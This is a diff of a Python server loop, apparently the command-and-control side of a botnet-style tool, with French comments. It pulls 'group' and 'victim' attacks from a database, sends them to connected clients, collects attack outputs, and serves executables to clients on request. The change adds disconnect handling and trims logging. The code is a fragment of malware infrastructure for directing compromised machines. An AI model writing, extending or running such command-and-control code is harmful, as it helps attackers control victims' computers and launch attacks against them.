@@ -54,7 +54,7 @@ def start_server(port, logger):
 
 
     while running:
-        print("[+] server is running")
+        # print("[+] server is running")
 
         db.cmd_refresh(1)
 
@@ -134,8 +134,8 @@ def start_server(port, logger):
         # Récupération des attaques de groupe à lancer
         attacks = get_group_attacks(mycursor)
 
-        print("[?] retreiving group attacks")
-        print("\t[+] " + str(len(attacks)) + " attack(s) found")
+        # print("[?] retreiving group attacks")
+        # print("\t[+] " + str(len(attacks)) + " attack(s) found")
         
 
         for attack in attacks:
@@ -180,8 +180,8 @@ def start_server(port, logger):
         # Récupération des attaques individuelles à lancer
         attacks = get_victim_attacks(mycursor)
 
-        print("[?] retreiving victim attacks")
-        print("\t[+] " + str(len(attacks)) + " attack(s) found")
+        # print("[?] retreiving victim attacks")
+        # print("\t[+] " + str(len(attacks)) + " attack(s) found")
         
 
         for attack in attacks:
@@ -219,19 +219,34 @@ def start_server(port, logger):
             
         #######################
 
+        # Gestion des clients
+        print("[+] " + str(len(clients)) + " client(s) connected")
+
         for client in clients:
-
             # Récupération des données clients
+
             try:
-                print("[?] checking client data" + str(client['addr']))
                 client_data = client['reception_queue'].get(timeout=1)
-                print("data received in for loop : " + str(client_data))
 
+                # Check si le client s'est deconnecté
+                if client_data == b'disconnected':
+                    print("[-] client disconnected " + str(client['addr']))
 
-                client_message = json.loads(re.sub('\n', '', client_data.decode()))
+                    # Mise à jour du statut dans la base de données
+                    update_status(db, mycursor, client['uid'])
 
+                    # Arrêt du thread d'émission
+                    client['emission_queue'].put(b"stop-thread")
+
+                    clients.remove(client)
+                    continue
+
+                
+                # Chargement du message en json
                 # Demande d'executable {"request":"XXX"}
                 # Retour d'attaque : {"id":"XXX","attack":"XXX","output":"XXX"}
+
+                client_message = json.loads(re.sub('\n', '', client_data.decode()))
 
                 if "request" in client_message:
                     # envoyer l'executable au client
